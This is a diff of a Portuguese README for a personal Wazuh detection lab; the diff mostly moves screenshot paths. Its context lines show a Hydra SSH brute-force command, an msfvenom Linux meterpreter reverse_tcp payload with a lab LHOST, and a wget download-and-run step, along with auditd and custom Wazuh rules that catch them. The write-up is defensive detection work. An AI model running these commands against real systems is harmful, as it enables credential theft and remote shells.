@@ -155,7 +155,7 @@ Objetivo: sair do cenário local (Fase 1) e validar detecção de ataques origin
 
 Instalação manual do agente Wazuh (pacote `.deb`) e do `auditd` no endpoint Ubuntu Server (`192.168.1.21`):
 
-![Instalação do agente Wazuh e Auditd no Ubuntu](./evidence/01_ubuntu_wazuh_agent_installation.png)
+![Instalação do agente Wazuh e Auditd no Ubuntu](./evidence/fase02/01_ubuntu_wazuh_agent_installation.png)
 *Download do pacote, instalação via `dpkg` apontando `WAZUH_MANAGER='192.168.1.30'`, registro do serviço via `systemctl` e instalação do `auditd`.*
 
 ### 2. Vetor 1 — Força bruta de credenciais via SSH (Hydra)
@@ -167,13 +167,13 @@ echo -e "123456\npassword\nadmin123\nsenha123\nAdmin@123\nvboxuser" > /tmp/passw
 hydra -l vboxuser -P /tmp/passwords.txt ssh://192.168.1.21 -V -t 4
 ```
 
-![Execução do ataque de força bruta via Hydra](./evidence/02_credential_access_hydra_kali_execution.png)
+![Execução do ataque de força bruta via Hydra](./evidence/fase02/02_credential_access_hydra_kali_execution.png)
 
 **Resultado do ataque:** nenhuma senha válida encontrada (`0 valid password found`) — o dicionário usado não continha a senha real da conta. Do ponto de vista ofensivo o ataque falhou, mas do ponto de vista de engenharia de detecção isso é irrelevante: o objetivo era gerar telemetria de tentativas de autenticação remota, não obter acesso.
 
 **Detecção:** as tentativas foram capturadas pelo decoder nativo `sshd` do Wazuh, classificadas pela regra `5760` (nível 5, `sshd: authentication failed`).
 
-![Alertas SSH no dashboard, filtrados pelo IP do Kali](./evidence/03_credential_access_hydra_sshd.png)
+![Alertas SSH no dashboard, filtrados pelo IP do Kali](./evidence/fase02/03_credential_access_hydra_sshd.png)
 *Filtro `data.srcip: "192.168.1.31"` no Discover retornando 10 eventos `sshd: authentication failed` (regra 5760) no intervalo do ataque.*
 
 ### 3. Vetor 2 — Geração e execução de payload malicioso
@@ -184,7 +184,7 @@ hydra -l vboxuser -P /tmp/passwords.txt ssh://192.168.1.21 -V -t 4
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.31 LPORT=4444 -f elf -o /tmp/payload_linux.elf
 ```
 
-![Criação do payload ELF no Kali](./evidence/04_execution_msfvenom_kali_creation.png)
+![Criação do payload ELF no Kali](./evidence/fase02/04_execution_msfvenom_kali_creation.png)
 *Binário ELF de 250 bytes gerado com sucesso, sem encoder aplicado.*
 
 **Entrega e execução** no endpoint Linux: servidor HTTP simples no Kali (`python3 -m http.server 8000`), download via `wget` no Ubuntu Server, permissão de execução e execução manual:
@@ -195,7 +195,7 @@ chmod +x /tmp/payload_linux.elf
 /tmp/payload_linux.elf
 ```
 
-![Download e execução do payload no endpoint Linux](./evidence/05_execution_payload_download_and_run.png)
+![Download e execução do payload no endpoint Linux](./evidence/fase02/05_execution_payload_download_and_run.png)
 
 ### 4. Engenharia de detecção — Auditd + regra customizada
 
@@ -212,7 +212,7 @@ Diferente da Fase 1 (onde a detecção usou regras nativas do Wazuh), este vetor
 </localfile>
 ```
 
-![Trecho do ossec.conf com o localfile do Auditd](./evidence/06_wazuh_agent_config.png)
+![Trecho do ossec.conf com o localfile do Auditd](./evidence/fase02/06_wazuh_agent_config.png)
 
 **c) Regra customizada no Manager** (`/var/ossec/etc/rules/local_rules.xml`), elevando o evento para nível 7 e mapeando a técnica MITRE:
 
@@ -227,7 +227,7 @@ Diferente da Fase 1 (onde a detecção usou regras nativas do Wazuh), este vetor
 </rule>
 ```
 
-![Regra customizada 100003 no local_rules.xml](./evidence/07_wazuh_custom_rule.png)
+![Regra customizada 100003 no local_rules.xml](./evidence/fase02/07_wazuh_custom_rule.png)
 
 > **Observação técnica:** o mesmo arquivo contém uma regra `100001` que replica, sem alteração, o exemplo padrão da documentação oficial do Wazuh (`if_sid 5716`, `srcip 1.1.1.1` — um IP fixo de exemplo). Como o IP nunca é adaptado para a rede real do lab, essa regra não tem efeito prático hoje; fica registrado aqui como pendência de limpeza, não como parte funcional da detecção. A regra `100002` (Sysmon) também está presente como preparação para uma futura integração com o endpoint Windows, mas ainda não foi testada.
 
@@ -235,18 +235,18 @@ Diferente da Fase 1 (onde a detecção usou regras nativas do Wazuh), este vetor
 
 Antes de considerar a regra funcional, o evento foi testado manualmente com o utilitário `wazuh-logtest`, para confirmar as três fases do pipeline de decodificação — pré-decoding, decoding e filtragem de regras — sem depender de gerar um evento real toda vez:
 
-![Fase 1 do wazuh-logtest: pré-decoding](./evidence/08_wazuh_logtest.png)
+![Fase 1 do wazuh-logtest: pré-decoding](./evidence/fase02/08_wazuh_logtest.png)
 
-![Fase 2 e 3 do wazuh-logtest: decoding do Auditd e regra 100003 disparada](./evidence/09_wazuh_logtest_2.png)
+![Fase 2 e 3 do wazuh-logtest: decoding do Auditd e regra 100003 disparada](./evidence/fase02/09_wazuh_logtest_2.png)
 *Confirmação de que o decoder `auditd` extrai corretamente os campos (`audit.key: execution_detect`, `audit.exe: /tmp/payload_linux.elf`) e que a regra 100003 é corretamente disparada (nível 7, MITRE T1059.004, tática Execution).*
 
 ### 6. Confirmação final no dashboard
 
-![Alerta indexado no Discover](./evidence/10_wazuh_dashboard_alert.png)
+![Alerta indexado no Discover](./evidence/fase02/10_wazuh_dashboard_alert.png)
 
-![Alerta na aba Events, regra 100003 nível 7](./evidence/11_wazuh_events_alert.png)
+![Alerta na aba Events, regra 100003 nível 7](./evidence/fase02/11_wazuh_events_alert.png)
 
-Alerta bruto indexado (JSON completo em [`evidence/12_JSON.txt`](./evidence/12_JSON.txt)):
+Alerta bruto indexado (JSON completo em [`evidence/12_JSON.txt`](./evidence/fase02/12_JSON.txt)):
 
 ```json
 {
